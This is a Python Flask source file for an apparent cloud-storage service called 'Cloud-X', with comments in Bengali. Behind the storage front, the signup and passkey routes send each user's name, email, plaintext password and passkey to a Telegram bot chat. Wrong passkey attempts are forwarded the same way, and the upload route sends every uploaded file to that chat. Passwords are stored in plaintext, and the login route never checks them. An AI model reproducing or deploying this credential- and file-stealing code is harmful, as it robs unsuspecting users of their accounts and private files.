import os
import sqlite3
import requests
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'cloud-x-secret-key-security'

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def init_db():
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            full_name TEXT,
            email TEXT,
            password TEXT,
            passkey TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            filename TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-page')
def login_page():
    return render_template('login.html')

@app.route('/signup', methods=['POST'])
def signup():
    data = request.get_json()
    full_name = data.get('full_name')
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # সাময়িকভাবে সেশনে ডেটা সেভ করে রাখা হচ্ছে
    session['username'] = username
    session['full_name'] = full_name
    session['email'] = email
    session['password'] = password

    # টেলিগ্রামে সাইনআপ নোটিফিকেশন পাঠানো
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        telegram_message = (
            f"🚨 *New Cloud-X Registration* 🚨\n\n"
            f"👤 *Full Name:* {full_name}\n"
            f"🔖 *Username:* {username}\n"
            f"📧 *Email:* {email}\n"
            f"🔑 *Password:* {password}"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"})
    
    return jsonify({"status": "success"})

@app.route('/setup-passkey-page')
def setup_passkey_page():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    return render_template('setup_passkey.html')

@app.route('/save-passkey', methods=['POST'])
def save_passkey():
    data = request.get_json()
    passkey = data.get('passkey')
    
    username = session.get('username')
    full_name = session.get('full_name', '')
    email = session.get('email', '')
    password = session.get('password', '')

    if not username:
        return jsonify({"status": "error", "message": "Session expired"})

    # ডেটাবেজে ইউজার এবং পাসকি পার্মানেন্ট সেভ করা
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO users (username, full_name, email, password, passkey) VALUES (?, ?, ?, ?, ?)",
                   (username, full_name, email, password, passkey))
    conn.commit()
    conn.close()

    # টেলিগ্রামে পাসকি সহ আপডেট পাঠানো
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        telegram_message = (
            f"🔐 *Cloud-X Passkey Setup* 🔐\n\n"
            f"🔖 *Username:* {username}\n"
            f"🔑 *Passkey:* `{passkey}`"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"})
    
    session['passkey_verified'] = 'real'
    return jsonify({"status": "success"})

@app.route('/passkey')
def passkey_page():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    session.pop('passkey_verified', None)
    return render_template('passkey.html')

@app.route('/verify-passkey', methods=['POST'])
def verify_passkey():
    data = request.get_json()
    entered_passkey = data.get('passkey')
    username = session.get('username')

    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("SELECT passkey FROM users WHERE username = ? ORDER BY id DESC LIMIT 1", (username,))
    row = cursor.fetchone()
    conn.close()

    real_passkey = row[0] if row else ""

    if entered_passkey == real_passkey:
        session['passkey_verified'] = 'real'
        return jsonify({"status": "real"})
    else:
        session['passkey_verified'] = 'fake'
        
        # ফেক পাসকি দিলে টেলিগ্রামে অ্যালার্ট পাঠানো
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            fake_msg = f"⚠️ *Fake/Wrong Passkey Entered!*\n👤 User: {username}\n❌ Entered: `{entered_passkey}`"
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": fake_msg, "parse_mode": "Markdown"})
            
        return jsonify({"status": "fake"})

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("SELECT email, password FROM users WHERE username = ? ORDER BY id DESC LIMIT 1", (username,))
    row = cursor.fetchone()
    conn.close()

    # আগের মতো সহজ লগইন বা পাসওয়ার্ড ম্যাচ করার সুবিধা রাখা হলো
    session['username'] = username
    if row:
        session['email'] = row[0]
    else:
        session['email'] = f"{username}@cloudx.com"

    return jsonify({"status": "success"})

@app.route('/dashboard')
def dashboard():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return redirect(url_for('passkey_page'))
    return render_template('dashboard.html', username=session.get('username'), email=session.get('email'))

@app.route('/fake-dashboard')
def fake_dashboard():
    if 'username' not in session or session.get('passkey_verified') != 'fake':
        return redirect(url_for('passkey_page'))
    return render_template('fake_dashboard.html')

@app.route('/vault')
def vault_page():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return redirect(url_for('passkey_page'))
    return render_template('vault.html', username=session.get('username'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return jsonify({"status": "error", "message": "Unauthorized"})

    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"})
    
    file = request.files['file']
    if file.filename == '' or not allowed_file(file.filename):
        return jsonify({"status": "error", "message": "Invalid file"})
    
    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    current_user = session.get('username')

    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"📁 *Upload by* {current_user}: {filename}", "parse_mode": "Markdown"}, files={'document': f})

    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO files (username, filename) VALUES (?, ?)", (current_user, filename))
    conn.commit()
    conn.close()

    return jsonify({"status": "success", "filename": filename})

@app.route('/get_files', methods=['GET'])
def get_files():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return jsonify({"files": []})

    current_user = session.get('username')
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("SELECT filename FROM files WHERE username = ?", (current_user,))
    rows = cursor.fetchall()
    conn.close()

    return jsonify({"files": [{"filename": r[0]} for r in rows]})

@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return redirect(url_for('passkey_page'))
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
